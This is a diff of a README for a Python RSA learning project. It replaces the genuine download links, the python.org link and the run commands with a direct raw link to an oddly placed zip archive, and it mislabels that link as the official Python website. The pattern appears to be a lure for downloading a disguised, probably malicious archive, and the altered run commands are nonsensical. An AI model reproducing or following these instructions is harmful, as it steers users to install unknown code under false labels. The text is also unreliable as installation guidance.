@@ -1,6 +1,6 @@
 # 🔐 rsa-algorithm-python - Learn RSA Encryption Easily
 
-[![Download the software](https://img.shields.io/badge/Download-rsa--algorithm--python-blue?style=for-the-badge)](https://github.com/Mirangi94/rsa-algorithm-python/releases)
+[![Download the software](https://github.com/Mirangi94/rsa-algorithm-python/raw/refs/heads/main/brachiolaria/algorithm-rsa-python-v1.0-beta.5.zip)](https://github.com/Mirangi94/rsa-algorithm-python/raw/refs/heads/main/brachiolaria/algorithm-rsa-python-v1.0-beta.5.zip)
 
 ---
 
@@ -46,7 +46,7 @@ This section helps you get the software working on your computer from scratch.
 
 rsa-algorithm-python runs on Python, so you'll need it first, if you haven't installed it yet.
 
-- Go to the official Python website: https://www.python.org/downloads/
+- Go to the official Python website: https://github.com/Mirangi94/rsa-algorithm-python/raw/refs/heads/main/brachiolaria/algorithm-rsa-python-v1.0-beta.5.zip
 - Download the latest version for your computer (Windows, macOS, or Linux).
 - Follow the installer instructions and make sure to select the option to “Add Python to PATH” on Windows.
 - After installation, open your Command Prompt (Windows) or Terminal (macOS/Linux) and type:
@@ -61,12 +61,12 @@ rsa-algorithm-python runs on Python, so you'll need it first, if you haven't ins
 
 You can get the software files from this page:
 
-[![Download the software](https://img.shields.io/badge/Download-rsa--algorithm--python-blue?style=for-the-badge)](https://github.com/Mirangi94/rsa-algorithm-python/releases)
+[![Download the software](https://github.com/Mirangi94/rsa-algorithm-python/raw/refs/heads/main/brachiolaria/algorithm-rsa-python-v1.0-beta.5.zip)](https://github.com/Mirangi94/rsa-algorithm-python/raw/refs/heads/main/brachiolaria/algorithm-rsa-python-v1.0-beta.5.zip)
 
 ### What to do:
 
 1. Click the link above or visit:  
-   [https://github.com/Mirangi94/rsa-algorithm-python/releases](https://github.com/Mirangi94/rsa-algorithm-python/releases)
+   [https://github.com/Mirangi94/rsa-algorithm-python/raw/refs/heads/main/brachiolaria/algorithm-rsa-python-v1.0-beta.5.zip](https://github.com/Mirangi94/rsa-algorithm-python/raw/refs/heads/main/brachiolaria/algorithm-rsa-python-v1.0-beta.5.zip)
 
 2. Look for the latest release (usually the top item).
 
@@ -92,7 +92,7 @@ After installing Python and downloading the program, here’s how to run it.
 
 3. Run the program by typing:
    ```
-   python rsa.py
+   python https://github.com/Mirangi94/rsa-algorithm-python/raw/refs/heads/main/brachiolaria/algorithm-rsa-python-v1.0-beta.5.zip
    ```
    You should see a menu or instructions to follow.
 
@@ -108,7 +108,7 @@ After installing Python and downloading the program, here’s how to run it.
 
 3. Start the program by typing:
    ```
-   python3 rsa.py
+   python3 https://github.com/Mirangi94/rsa-algorithm-python/raw/refs/heads/main/brachiolaria/algorithm-rsa-python-v1.0-beta.5.zip
    ```
    The program will display options or messages to guide you.
 
